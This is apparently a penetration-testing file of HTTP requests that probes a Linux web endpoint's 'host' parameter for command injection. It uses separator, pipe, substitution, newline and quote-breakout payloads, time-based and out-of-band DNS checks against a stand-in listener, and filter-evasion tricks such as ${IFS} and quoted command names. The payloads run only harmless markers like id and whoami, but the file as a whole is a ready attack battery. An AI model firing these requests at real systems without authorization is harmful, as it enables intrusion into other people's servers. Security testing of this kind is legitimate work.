###
# Safe PoC -> x8bitranjit
# ============================================================================
# Linux command-injection PoC battery (.http format - VS Code REST Client /
# pasteable into Burp Repeater). x8bitranjit lab style. Authorized testing only.
#
# WHAT TO EDIT:  target.example.invalid  -> your authorized target;  /api/ping?host=
# -> the actual vulnerable parameter. Payloads are BENIGN markers only
# (id/whoami/expr 7*7) - never destructive commands.
#
# HOW TO USE: fire top-to-bottom; the FIRST row that returns command output
# (uid=...) or a ~10s delay proves Linux command injection. If Linux rows
# are silent, run cmdi_windows_poc.http (Linux-silent != safe).
# KIT CROSS-REF: CommandInjection_CHECKLIST rows 004-016.
# ============================================================================

### 1) separator battery (in-band - output reflected?)
GET https://target.example.invalid/api/ping?host=127.0.0.1;id HTTP/1.1
Host: target.example.invalid

### 2) pipe variants
GET https://target.example.invalid/api/ping?host=127.0.0.1|id HTTP/1.1
Host: target.example.invalid

### 3) OR/AND variants (|| runs on failure - strong blind test)
GET https://target.example.invalid/api/ping?host=127.0.0.1||id HTTP/1.1
Host: target.example.invalid

###
GET https://target.example.invalid/api/ping?host=127.0.0.1&&id HTTP/1.1
Host: target.example.invalid

### 4) substitution forms
GET https://target.example.invalid/api/ping?host=127.0.0.1%60id%60 HTTP/1.1
Host: target.example.invalid

###
GET https://target.example.invalid/api/ping?host=127.0.0.1$(id) HTTP/1.1
Host: target.example.invalid

### 5) newline separator (survives most metachar filters)
GET https://target.example.invalid/api/ping?host=127.0.0.1%0aid HTTP/1.1
Host: target.example.invalid

### 6) quoted-context breakouts (try after plain rows fail)
GET https://target.example.invalid/api/ping?host=127.0.0.1%22;id;%22 HTTP/1.1
Host: target.example.invalid

###
GET https://target.example.invalid/api/ping?host=127.0.0.1%27;id;%27 HTTP/1.1
Host: target.example.invalid

### 7) time-based blind (confirm via delay; repeat 3x vs baseline)
GET https://target.example.invalid/api/ping?host=127.0.0.1;sleep+10 HTTP/1.1
Host: target.example.invalid

### 8) OOB confirm (EDIT: YOUR-OOB-HOST.example.invalid -> your listener)
GET https://target.example.invalid/api/ping?host=127.0.0.1;nslookup+cmdi-linux.YOUR-OOB-HOST.example.invalid HTTP/1.1
Host: target.example.invalid

### 9) space-filter evasion (${IFS}) - when spaces are stripped
GET https://target.example.invalid/api/ping?host=127.0.0.1;cat${IFS}/etc/hostname HTTP/1.1
Host: target.example.invalid

### 10) keyword-filter evasion (quoted command names)
GET https://target.example.invalid/api/ping?host=127.0.0.1;w%27hoami HTTP/1.1
Host: target.example.invalid
